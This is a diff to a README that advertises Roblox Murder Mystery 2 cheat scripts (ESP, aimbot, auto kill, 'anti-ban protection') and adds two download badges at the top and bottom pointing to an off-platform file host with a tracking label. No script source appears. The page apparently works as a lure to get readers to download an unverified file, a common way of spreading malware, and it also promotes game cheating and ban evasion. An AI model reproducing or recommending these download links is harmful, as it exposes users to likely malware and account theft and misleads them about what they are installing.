@@ -1,3 +1,5 @@
+[![Download RobloxMM2 Script](https://img.shields.io/badge/Download-RobloxMM2%20Script-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+
 # 🔫 MM2 Scripts – Dominate Murder Mystery 2! 💀  
 
 Welcome to the ultimate **MM2 (Murder Mystery 2) scripts** collection! These powerful scripts will help you gain an edge in the game with ESP, aimbot, auto gun, and much more. Become the top player in no time!
@@ -11,3 +13,5 @@ Welcome to the ultimate **MM2 (Murder Mystery 2) scripts** collection! These pow
 - ✅ **Speed Boost** (Move faster than others)  
 - ✅ **Auto Kill** (Automatically eliminate enemies)  
 - ✅ **Anti-Ban Protection** (Safe and secure use)
+
+[![Download RobloxMM2 Script](https://img.shields.io/badge/Download-RobloxMM2%20Script-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
